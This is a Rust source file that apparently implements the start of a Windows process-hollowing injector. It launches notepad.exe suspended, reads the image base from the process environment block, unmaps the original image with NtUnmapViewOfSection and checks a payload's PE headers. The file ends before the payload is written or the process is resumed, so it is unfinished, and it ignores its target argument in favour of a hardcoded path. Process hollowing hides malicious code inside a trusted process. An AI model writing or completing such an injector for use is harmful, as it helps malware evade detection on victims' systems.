use std::{
    fs::{self, File},
    io::Read,
    mem::zeroed,
    ops::Add,
    ptr::null_mut,
};

use windows_sys::{
    Wdk::System::{
        Memory::NtUnmapViewOfSection,
        Threading::{NtQueryInformationProcess, ProcessWin32kSyscallFilterInformation},
    },
    Win32::System::{
        Diagnostics::Debug::{IMAGE_NT_HEADERS64, ReadProcessMemory},
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
            STARTUPINFOA,
        },
    },
};

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 3 {
        println!("Usage: {} <target_process> <payload_path>", args[0]);
        println!(
            "  [+] {} C:\\Windows\\System32\\notepad.exe C:\\Windows\\System32\\calc.exe",
            args[0]
        );
        return;
    }

    let mut fd = match File::open(args.get(2).unwrap()) {
        Ok(file) => file,
        Err(e) => {
            println!("[-] Failed to open payload file: {}", e);
            return;
        }
    };

    let mut buffer: Vec<u8> = Vec::new();

    fd.read_to_end(&mut buffer).unwrap();

    println!("[+] Payload file size: {} bytes", buffer.len());

    let mut fd2 = match File::open(args.get(1).unwrap()) {
        Ok(file) => file,
        Err(e) => {
            println!("[-] Failed to open target process file: {}", e);
            return;
        }
    };

    let mut buffer2: Vec<u8> = Vec::new();

    fd2.read_to_end(&mut buffer2).unwrap();

    println!("[+] Target process file size: {} bytes", buffer2.len());

    if buffer2.len() < buffer.len() {
        println!("[-] Target process file is smaller than payload file");
        return;
    }

    let proc_name = "C:\\Windows\\System32\\notepad.exe\0";

    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        si.cb = size_of::<STARTUPINFOA>() as u32;
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        if CreateProcessA(
            proc_name.as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to create process");
            return;
        }

        println!("[+] Created suspended process with PID: {}", pi.dwProcessId);

        let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
        let mut return_length = 0;
        let mut status = NtQueryInformationProcess(
            pi.hProcess,
            0,
            &mut pbi as *mut _ as *mut _,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query process information");
            return;
        }

        let mut base_addr = 0;
        let mut bytes_read = 0;
        if ReadProcessMemory(
            pi.hProcess,
            (pbi.PebBaseAddress as usize + 0x10) as *const _,
            &mut base_addr as *mut _ as *mut _,
            size_of::<usize>() as usize,
            &mut bytes_read,
        ) == 0
        {
            println!("[-] Failed to read process memory");
            return;
        }

        let status = NtUnmapViewOfSection(pi.hProcess, base_addr as *const _);
        if status != 0 {
            println!("[-] Failed to unmap view of section");
            return;
        }

        let dos_header = buffer.as_ptr() as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature in payload");
            return;
        }

        let nt_headers = (buffer.as_ptr() as usize).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature in payload");
            return;
        }
    }
}
